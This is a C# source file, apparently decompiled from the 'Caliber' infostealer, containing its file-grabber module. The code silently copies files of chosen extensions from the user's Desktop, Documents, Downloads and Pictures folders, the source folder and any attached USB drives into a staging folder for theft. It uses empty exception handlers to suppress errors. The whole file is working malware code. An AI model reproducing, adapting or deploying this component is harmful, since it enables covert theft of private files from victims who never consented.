﻿using System;
using System.Collections.Generic;
using System.IO;

namespace youknowcaliber
{
	public class Files
	{
		public static void GetFiles()
		{
			try
			{
				string text = Help.ExploitDir + "\\FileGrabber\\Desktop";
				string target = Help.ExploitDir + "\\FileGrabber\\Downloads";
				string target2 = Help.ExploitDir + "\\FileGrabber\\Documents";
				string target3 = Help.ExploitDir + "\\FileGrabber\\Pictures";
				string target4 = Help.ExploitDir + "\\FileGrabber\\USB";
				Directory.CreateDirectory(text);
				bool flag = !Directory.Exists(text);
				if (flag)
				{
					Files.GetFiles();
				}
				else
				{
					foreach (DriveInfo driveInfo in DriveInfo.GetDrives())
					{
						bool flag2 = driveInfo.DriveType == DriveType.Removable && driveInfo.IsReady;
						if (flag2)
						{
							Files.CopyDirectory(driveInfo.RootDirectory.FullName, target4, "*.*", (long)Config.sizefile);
						}
					}
					Files.CopyDirectory(Help.DesktopPath, text, "*.*", (long)Config.sizefile);
					Files.CopyDirectory(Help.MyDocuments, target2, "*.*", (long)Config.sizefile);
					Files.CopyDirectory(Help.Downloads, target, "*.*", (long)Config.sizefile);
					Files.CopyDirectory(Help.Pictures, target3, "*.*", (long)Config.sizefile);
					Files.CopyDirectory(Help.UserProfile + "\\source", text, "*.*", (long)Config.sizefile);
				}
			}
			catch
			{
			}
		}

		private static long GetDirSize(string path, long size = 0L)
		{
			try
			{
				foreach (string fileName in Directory.EnumerateFiles(path))
				{
					try
					{
						size += new FileInfo(fileName).Length;
					}
					catch
					{
					}
				}
				foreach (string path2 in Directory.EnumerateDirectories(path))
				{
					try
					{
						size += Files.GetDirSize(path2, 0L);
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
			return size;
		}

		public static void CopyDirectory(string source, string target, string pattern, long maxSize)
		{
			Stack<GetFiles.Folders> stack = new Stack<GetFiles.Folders>();
			stack.Push(new GetFiles.Folders(source, target));
			long num = Files.GetDirSize(target, 0L);
			while (stack.Count > 0)
			{
				GetFiles.Folders folders = stack.Pop();
				try
				{
					Directory.CreateDirectory(folders.Target);
					foreach (string text in Directory.EnumerateFiles(folders.Source, pattern))
					{
						try
						{
							bool flag = Array.IndexOf<string>(Config.extensions, Path.GetExtension(text).ToLower()) < 0;
							if (!flag)
							{
								string text2 = Path.Combine(folders.Target, Path.GetFileName(text));
								bool flag2 = new FileInfo(text).Length / 1024L < 5000L;
								if (flag2)
								{
									File.Copy(text, text2);
									num += new FileInfo(text2).Length;
									bool flag3 = num > maxSize;
									if (flag3)
									{
										return;
									}
									Files.count++;
								}
							}
						}
						catch
						{
						}
					}
				}
				catch (UnauthorizedAccessException)
				{
					continue;
				}
				catch (PathTooLongException)
				{
					continue;
				}
				try
				{
					foreach (string text3 in Directory.EnumerateDirectories(folders.Source))
					{
						try
						{
							bool flag4 = !text3.Contains(Path.Combine(Help.DesktopPath, Environment.UserName));
							if (flag4)
							{
								stack.Push(new GetFiles.Folders(text3, Path.Combine(folders.Target, Path.GetFileName(text3))));
							}
						}
						catch
						{
						}
					}
				}
				catch (UnauthorizedAccessException)
				{
				}
				catch (DirectoryNotFoundException)
				{
				}
				catch (PathTooLongException)
				{
				}
			}
			stack.Clear();
		}

		public static int count = 0;

		public static Queue<string> Drives = new Queue<string>();
	}
}
